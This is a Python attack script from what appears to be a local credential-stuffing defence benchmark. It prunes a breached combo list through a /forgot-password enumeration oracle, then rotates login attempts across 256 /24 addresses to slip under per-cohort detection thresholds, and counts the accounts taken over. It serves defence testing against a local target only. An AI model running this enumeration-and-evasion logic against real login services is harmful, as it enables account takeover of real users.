"""Round 2 attack — clean-list stuffer that spreads across cohorts.

Two moves beat per-cohort ratios:

  1. Prune the combo list through the /forgot-password enumeration oracle, keeping
     only emails that actually exist. The unknown-account ratio collapses to zero.
  2. Give every surviving attempt its own /24 (drawn from a wide pool), so no
     cohort ever reaches the detector's minimum sample size.

What is left for the defender is only the *aggregate*: total attempts and
new-account logins are clearly elevated, but there is no cohort precise enough to
challenge without challenging everyone. That dead end is what motivates L3 — stop
handing out the oracle, and screen the breached passwords the list is made of.
"""

from __future__ import annotations

import asyncio
import ipaddress
import itertools

import httpx

from _common import BASE_URL, edge_headers, is_success, load_combos, require_local_target

# A wide pool spanning 256 distinct /24s (benchmark range 198.18.0.0/16) — one
# cohort per handful of attempts, so none reaches the detector's sample floor.
WIDE_POOL = itertools.cycle(f"198.18.{octet}.10" for octet in range(256))
CONCURRENCY = 20
ACTOR = "bot:round2"


async def prune(client: httpx.AsyncClient, combos) -> list[tuple[str, str]]:
    """Drop pairs whose email the /forgot-password oracle says does not exist."""
    kept: list[tuple[str, str]] = []
    sem = asyncio.Semaphore(CONCURRENCY)

    async def probe(email, pw):
        async with sem:
            try:
                r = await client.post("/forgot-password", json={"email": email},
                                      headers=edge_headers(ACTOR, next(WIDE_POOL)))
                # Below L3 the oracle leaks: 200 = real account, 404 = unknown.
                if r.status_code == 200:
                    kept.append((email, pw))
            except httpx.RequestError:
                pass

    await asyncio.gather(*(probe(e, p) for e, p in combos))
    return kept


async def run() -> dict:
    require_local_target(BASE_URL)
    combos = load_combos()
    hits: list[str] = []
    sem = asyncio.Semaphore(CONCURRENCY)

    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
        cleaned = await prune(client, combos)

        async def attempt(email, pw):
            async with sem:
                try:
                    r = await client.post("/login", json={"email": email, "password": pw},
                                          headers=edge_headers(ACTOR, next(WIDE_POOL)))
                    if is_success(r):
                        hits.append(email)
                except httpx.RequestError:
                    pass

        await asyncio.gather(*(attempt(e, p) for e, p in cleaned))

    return {"attack": ACTOR, "attempts": len(combos), "pruned_to": len(cleaned),
            "accounts_taken_over": len(hits), "hits": sorted(hits)}


def main():
    result = asyncio.run(run())
    print(f"[{result['attack']}] pruned {result['attempts']} -> {result['pruned_to']} existing, "
          f"{result['accounts_taken_over']} accounts taken over")


if __name__ == "__main__":
    main()
